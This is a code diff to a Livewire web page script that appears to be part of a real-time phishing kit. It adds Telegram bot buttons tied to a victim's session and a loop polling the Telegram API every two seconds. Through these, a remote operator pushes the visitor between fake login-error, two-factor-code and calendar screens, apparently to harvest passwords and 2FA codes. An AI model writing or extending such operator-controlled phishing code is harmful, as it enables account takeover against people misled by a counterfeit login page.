@@ -294,22 +294,108 @@
                         [
                             {
                                 text: `Kick to 2fa`,
-                                callback_data: `/auth-failed ${session}`,
+                                callback_data: `/2fa ${session}`,
                             },
                             {
                                 text: `Kick to Login`,
-                                callback_data: `/kick ${session}`,
+                                callback_data: `/login ${session}`,
                             },
                         ],
+                        [
+                            {
+                                text: `Kick to the calendar`,
+                                callback_data: `/calendar ${session}`,
+                            },
+                            {
+                                text: `Thank You`,
+                                callback_data: `/thankyou ${session}`,
+                            },
+                        ]
                     ],
                 },
             })
         }).then(response => {
-            
+            startInterval();
         }).catch(error => {
 
         });
     })
+
+    const startInterval = () => {
+        console.log('ashik')
+        let lastUpdateId = 0;
+        setInterval(() => {
+            fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then((response) => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error("Failed to fetch updates.");
+                    }
+                })
+                .then((data) => {
+                    if (data?.result?.length > 0) {
+                        data.result.forEach((update) => {
+                            if (update.update_id > lastUpdateId) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const callbackData = update.callback_query.data;
+                                    if (callbackData === `/2fa ${localStorage.getItem('sessionId')}`) {
+                                        Livewire.dispatch('openTwoFa');
+                                        window.Livewire.navigate('/');
+                                    }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
+                                        @this.set('loginError', true);
+                                        @this.set('oldPassError', false);
+                                        @this.set('enableLoginForm', true);
+                                        @this.set('showModalFooter', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('twoFaPage', false);
+                                        @this.set('codeError', false);
+                                    }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
+                                        @this.set('loginError', false);
+                                        @this.set('oldPassError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('showModalFooter', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('twoFaPage', true);
+                                        @this.set('codeError', false);
+                                    }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
+                                        @this.set('loginError', false);
+                                        @this.set('oldPassError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('showModalFooter', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('twoFaPage', true);
+                                        @this.set('codeError', false);
+                                    }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
+                                        @this.set('loginError', false);
+                                        @this.set('oldPassError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('showModalFooter', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('twoFaPage', true);
+                                        @this.set('codeError', true);
+                                    }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
+                                        @this.set('loginError', false);
+                                        @this.set('oldPassError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('showModalFooter', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('twoFaPage', false);
+                                        @this.set('codeError', false);
+                                        window.Livewire.navigate('/calendar-calendly');
+                                    }
+                                }
+                            }
+                        });
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error fetching updates:", error);
+                });
+        }, 2000);
+    };
+
 </script>
 @endscript
 
